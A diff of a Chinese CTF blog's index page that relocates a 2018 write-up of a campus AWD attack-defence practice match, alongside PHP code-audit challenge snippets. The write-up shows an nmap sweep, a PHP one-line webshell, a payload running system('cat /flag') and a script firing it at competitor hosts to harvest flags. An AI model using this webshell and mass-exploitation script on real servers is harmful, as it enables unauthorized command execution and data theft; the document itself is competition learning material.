@@ -563,94 +563,6 @@
 
 
   
-    <article id="post-CTFawd" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/07/06/CTFawd/" class="article-date">
-      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/07/06/CTFawd/">AWD 校内练习赛</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h3 id="本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验"><a href="#本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验" class="headerlink" title="本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验."></a>本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验.</h3><h2 id="AWD模式"><a href="#AWD模式" class="headerlink" title="AWD模式"></a>AWD模式</h2><p>AWD：Attack With Defence，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
-<ul>
-<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
-<li>可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析；</li>
-<li>flag在主办方的设定下每隔一定时间刷新一轮；</li>
-<li>各队一般都有自己的初始分数；</li>
-<li>flag一旦被其他队伍拿走，该队扣除一定积分；</li>
-<li>扣除的积分由获取flag的队伍均分；</li>
-<li>主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分；</li>
-<li>一般每个队伍会给一个低权限用户，非root权限；<h2 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h2></li>
-<li>做好备份,在龙哥指导下,下载了Winscp建立起站点,按照说明书给的题目ip进行会话连接,可以看到自己的flag和源代码题目目录等等,这就是自己的flag与目录了。然后将这些所有文件夹进行复制备份,龙哥说可以在被入侵时删掉这些后门重新放进去备份.</li>
-<li>比赛可能会告诉你其他队伍的IP，也可能不会告诉你，一般在同一个C段或者B段，因此首先可以利用nmap等扫描工具发现其他队伍的IP</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sn 192.168.71.0/24</span><br></pre></td></tr></table></figure>
-<p>或者用<a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> 的脚本进行扫描 </p>
-<h2 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h2><ul>
-<li>这里我用的webshell检测工具D盾,可以对源代码查出漏洞问题，从而进行挖洞以及自身后门的防备。这里的备份很关键，方便自己找出后门漏洞。</li>
-<li>拿到源代码后立刻用D盾进行扫描<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/XWUQ185~YHF1ON@2C83A08J.png" alt="image"><br>可以看到许多漏洞,最简单的是一句话木马.<br><br>比赛题型有很多，就拿我做的一道最简单的一句话木马来作例子<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_POST[&quot;HDwiki&quot;]);</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>这题有两种方法<br></p>
-<ul>
-<li><p>构造post如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDwiki=system(&apos;cat ./flag&apos;)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>也可以用菜刀连接，方便直观flag的目录所在，还可以上传一句话木马防备对手进行删掉原有的一句话木马</p>
-</li>
-<li>写脚本爆破，下面附上龙哥写的脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url_submit = &quot;http://172.16.4.1/Common/submitAnswer&quot;</span><br><span class="line"></span><br><span class="line">url_test = &quot;http://172.16.5.20:5050/index.php&quot;</span><br><span class="line">url = [</span><br><span class="line">	&quot;http://172.16.5.14:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.13:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.16:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.15:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.20:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.19:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.18:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.17:5050/index.php&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">post_data = &#123;&apos;HDwiki&apos;:&quot;system(&apos;cat /flag&apos;);&quot;&#125;</span><br><span class="line"></span><br><span class="line">token = &apos;f7dfe4ef29acdf1036bd971e3488c5f6&apos;</span><br><span class="line"></span><br><span class="line"># submit_flag = &#123;&apos;answer&apos;:flag,&apos;token&apos;:token&#125;</span><br><span class="line">for i in url:</span><br><span class="line">	response = requests.post(i, data = post_data)</span><br><span class="line">	print(response.text[0:36])</span><br><span class="line">	flag = response.text[0:36]</span><br><span class="line">	# if &quot;flag&quot; in response.text:</span><br><span class="line">	# 	print(&quot;flag in &quot;)</span><br><span class="line">	# print(token)</span><br><span class="line">	sub_response = requests.post(url_submit,data = &#123;&apos;answer&apos;:flag,&apos;token&apos;:token&#125;)</span><br><span class="line">	print(sub_response.text)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这只是校内练习赛而已，第一次接触awd模式的CTF学到了很多，上面方法有点水不能在真正赛场用，有点慢，一般都走写脚本。祝大家打比赛快乐。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
     <article id="post-bugkuCTF 代码审计" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -717,6 +629,94 @@
 <h2 id="0x11-strpos数组绕过"><a href="#0x11-strpos数组绕过" class="headerlink" title="0x11 strpos数组绕过"></a>0x11 strpos数组绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&apos;ctf&apos;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE)</span><br><span class="line">echo &apos;必须输入数字才行&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>这个上面说过了，strpos不能处理数组，返回null<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/15.php?ctf[]=%00a</span><br></pre></td></tr></table></figure></p>
 <h2 id="0x12-数字验证正则绕过"><a href="#0x12-数字验证正则绕过" class="headerlink" title="0x12 数字验证正则绕过"></a>0x12 数字验证正则绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CTFawd" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/CTFawd/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.523Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/CTFawd/">AWD 校内练习赛</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验"><a href="#本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验" class="headerlink" title="本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验."></a>本人没打过awd模式，和pwn大佬组队打了场练习赛，学到了很多，下面作总结一下经验.</h3><h2 id="AWD模式"><a href="#AWD模式" class="headerlink" title="AWD模式"></a>AWD模式</h2><p>AWD：Attack With Defence，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
+<ul>
+<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
+<li>可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析；</li>
+<li>flag在主办方的设定下每隔一定时间刷新一轮；</li>
+<li>各队一般都有自己的初始分数；</li>
+<li>flag一旦被其他队伍拿走，该队扣除一定积分；</li>
+<li>扣除的积分由获取flag的队伍均分；</li>
+<li>主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分；</li>
+<li>一般每个队伍会给一个低权限用户，非root权限；<h2 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h2></li>
+<li>做好备份,在龙哥指导下,下载了Winscp建立起站点,按照说明书给的题目ip进行会话连接,可以看到自己的flag和源代码题目目录等等,这就是自己的flag与目录了。然后将这些所有文件夹进行复制备份,龙哥说可以在被入侵时删掉这些后门重新放进去备份.</li>
+<li>比赛可能会告诉你其他队伍的IP，也可能不会告诉你，一般在同一个C段或者B段，因此首先可以利用nmap等扫描工具发现其他队伍的IP</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sn 192.168.71.0/24</span><br></pre></td></tr></table></figure>
+<p>或者用<a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> 的脚本进行扫描 </p>
+<h2 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h2><ul>
+<li>这里我用的webshell检测工具D盾,可以对源代码查出漏洞问题，从而进行挖洞以及自身后门的防备。这里的备份很关键，方便自己找出后门漏洞。</li>
+<li>拿到源代码后立刻用D盾进行扫描<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/XWUQ185~YHF1ON@2C83A08J.png" alt="image"><br>可以看到许多漏洞,最简单的是一句话木马.<br><br>比赛题型有很多，就拿我做的一道最简单的一句话木马来作例子<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_POST[&quot;HDwiki&quot;]);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这题有两种方法<br></p>
+<ul>
+<li><p>构造post如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDwiki=system(&apos;cat ./flag&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>也可以用菜刀连接，方便直观flag的目录所在，还可以上传一句话木马防备对手进行删掉原有的一句话木马</p>
+</li>
+<li>写脚本爆破，下面附上龙哥写的脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url_submit = &quot;http://172.16.4.1/Common/submitAnswer&quot;</span><br><span class="line"></span><br><span class="line">url_test = &quot;http://172.16.5.20:5050/index.php&quot;</span><br><span class="line">url = [</span><br><span class="line">	&quot;http://172.16.5.14:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.13:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.16:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.15:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.20:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.19:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.18:5050/index.php&quot;,</span><br><span class="line">	&quot;http://172.16.5.17:5050/index.php&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">post_data = &#123;&apos;HDwiki&apos;:&quot;system(&apos;cat /flag&apos;);&quot;&#125;</span><br><span class="line"></span><br><span class="line">token = &apos;f7dfe4ef29acdf1036bd971e3488c5f6&apos;</span><br><span class="line"></span><br><span class="line"># submit_flag = &#123;&apos;answer&apos;:flag,&apos;token&apos;:token&#125;</span><br><span class="line">for i in url:</span><br><span class="line">	response = requests.post(i, data = post_data)</span><br><span class="line">	print(response.text[0:36])</span><br><span class="line">	flag = response.text[0:36]</span><br><span class="line">	# if &quot;flag&quot; in response.text:</span><br><span class="line">	# 	print(&quot;flag in &quot;)</span><br><span class="line">	# print(token)</span><br><span class="line">	sub_response = requests.post(url_submit,data = &#123;&apos;answer&apos;:flag,&apos;token&apos;:token&#125;)</span><br><span class="line">	print(sub_response.text)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这只是校内练习赛而已，第一次接触awd模式的CTF学到了很多，上面方法有点水不能在真正赛场用，有点慢，一般都走写脚本。祝大家打比赛快乐。</p>
+
       
     </div>
     
